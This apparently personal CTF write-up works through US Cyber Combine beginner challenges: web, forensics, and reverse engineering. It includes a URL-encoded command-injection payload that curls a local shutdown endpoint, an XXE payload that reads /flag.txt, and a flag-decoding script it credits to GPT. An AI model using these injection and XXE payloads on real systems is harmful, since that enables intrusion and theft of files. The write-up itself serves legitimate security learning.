

# Beginner's Room

flag structure: `SIVBGR{xxxxxx}`

## Control Panel [Web]

- modify the `aria-expanded="false"` to true
- then get the file and reverse engineer. Notice the `destroy.py` and the `/shutdown` path


URL encode the a malicious code to curl the localhost to get to `/shutdown`
`https://uscybercombine-s4-control-panel.chals.io/?command=destroy_humans&arg=%63%75%72%6C%20%2D%73%20%6C%6F%63%61%6C%68%6F%73%74%3A%33%30%30%30%2F%73%68%75%74%64%6F%77%6E`


## Secret [Forensics]
- open in kali and left click highlight over your items
- ![alt text](topsecret.png)



## I Want to Believe [Forensics]
- gift.gif
- possible lead? seems to have a white flash frame in the gif
ffmpeg -i input/gift.gif -fps_mode 0 temp/temp%d.png

steghide extract -sf ./gift.gif -p ""

## Hunt [web]

1. P1 inspect the html page
  - `SIVBGR{r1s3_`
2. P2 check /robots.txt
  - `0f_th3_`
3. p3 check `https://uscybercombine-s4-hunt.chals.io/secret-bot-spot` 
  - check the `robot.js` file: `r0b0ts!}`


## Flag Checker [Reverse Engineering]


- According to GPT: 
TLDR: literally swap out the operations in reverse and use better variable names. 


To decrypt the flag from this Python code, we need to reverse the operations applied to `libraryDiscussion` to transform it into `phoneSteak`. Here are the steps to decrypt the flag:

1. Reverse the final transformation which combines `lineMoon` and `puddingCommission`.
2. Reverse the swapping operations.
3. Reverse the XOR operation and the subtraction of 27.


```
# Given encrypted list
phoneSteak = [55, 33, 52, 40, 35, 56, 86, 90, 66, 111, 81, 26, 23, 75, 109, 26, 88, 90, 75, 67, 92, 25, 87, 88, 92, 84, 23, 88]

# Step 1: Reverse the final transformation (combine lineMoon and puddingCommission)
len_tinRoyalty = len(phoneSteak)
mid = len_tinRoyalty // 2
furRegret = phoneSteak
lineMoon = furRegret[:mid]
puddingCommission = furRegret[mid:]
puddingCommission.reverse()
tinRoyalty = lineMoon + puddingCommission

# Step 2: Reverse the swapping operations
seaTent = 6
callCover = 17
foxEmbox = (248 // len_tinRoyalty) % len_tinRoyalty
outfitStrike = 10
brushCopy = (341 // len_tinRoyalty) % 17
injectPush = (1240 + 28 // len_tinRoyalty) % len_tinRoyalty

# Swapping outfitStrike and foxEmbox
tinRoyalty[outfitStrike], tinRoyalty[foxEmbox] = tinRoyalty[foxEmbox], tinRoyalty[outfitStrike]

# Swapping callCover and brushCopy
tinRoyalty[callCover], tinRoyalty[brushCopy] = tinRoyalty[brushCopy], tinRoyalty[callCover]

# Swapping seaTent and injectPush
tinRoyalty[seaTent], tinRoyalty[injectPush] = tinRoyalty[injectPush], tinRoyalty[seaTent]

# Step 3: Reverse the XOR operation and the subtraction of 27
decrypted_values = [value ^ 15 for value in tinRoyalty]
original_ascii_values = [value + 27 for value in decrypted_values]

# Convert ASCII values back to characters to form the flag
decrypted_flag = ''.join(chr(value) for value in original_ascii_values)

print(decrypted_flag)
```


## Parts Shop [Web]

### Task

```
Parts Shop [Web]
150
We've found an online shop for robot parts. We suspect ARIA is trying to embody itself to take control of the physical world. You need to stop it ASAP! (Note: The flag is located in /flag.txt)

https://uscybercombine-s4-parts-shop.chals.io/
```


### My Solution

1. Enum the site on burp
  - not strange findings
2. checked the JS on each page. Noticed /blueprints page is a form. 
  - tried JS injection `console.log('hello')` ... nope
  - tried SQL injection with `105 OR 1=1` and etc .. nope

  - curled for XML site maps 
  `curl -X GET "https://uscybercombine-s4-parts-shop.chals.io/parts" -H "Content-type: text/xml; charset=UTF-8"`

  received this reply:
```
<?xml version="1.0" encoding="UTF-8"?><parts><part id="1"><name>XtraGrip Robo Arm 3000</name><author>Bender</author><image>/static/img/xtragrip.png</image><description>A necessity for all tactile machines that need to interact with the human world.</description></part><part id="2"><name>Xray Scan Matrix 1.4</name><author>Baymax</author><image>/static/img/xrayscan.png</image><description>A component for your vision system using X-ray technology to analyze the environment.</description></part><part id="3"><name>ElectroSynth Core U-152</name><author>Optimus Prime</author><image>/static/img/electrosynth.png</image><description>The newest version of the main module for regulating internal functions.</description></part></parts>    
```

hmmm seems like an interesting lead on part id, let's enum through.... 
  - tried https://uscybercombine-s4-parts-shop.chals.io/parts?id=4 and etc and URL params ... no luck


4. Noticed JS on /blueprints POST payload 
- seems to be .... printing almost exactly what was being sent... No sanitization of XML... **BINGO!!**

```
  <script>
    function generateXML(event) {
      event.preventDefault();

      var name = document.getElementById('name').value;
      var author = document.getElementById('author').value;
      var image = document.getElementById('image').value;
      var description = document.getElementById('description').value;

      var payload = '<?xml version="1.0" encoding="UTF-8"?>\n' +
        '<part>\n' +
        '  <name>' + name + '</name>\n' +
        '  <author>' + author + '</author>\n' +
        '  <image>' + image + '</image>\n' +
        '  <description>' + description + '</description>\n' +
        '</part>';

      fetch("/blueprint", {
        method: "POST",
        body: payload,
      })
      .then(res => {
        if (res.redirected) {
          window.location.href = res.url;
        } else if (res.status == 400) {
          document.getElementById("error").innerHTML = "Please fill out all required fields.";
        }
      })
      .catch(error => console.error(error));
    }
  </script>
```


5. Intercept POST payload of /blueprints page with XXE and a custom 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE part [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<part>
  <name>&xxe;</name>
  <author>Test</author>
  <image>Test</image>
  <description>Test</description>
</part>

```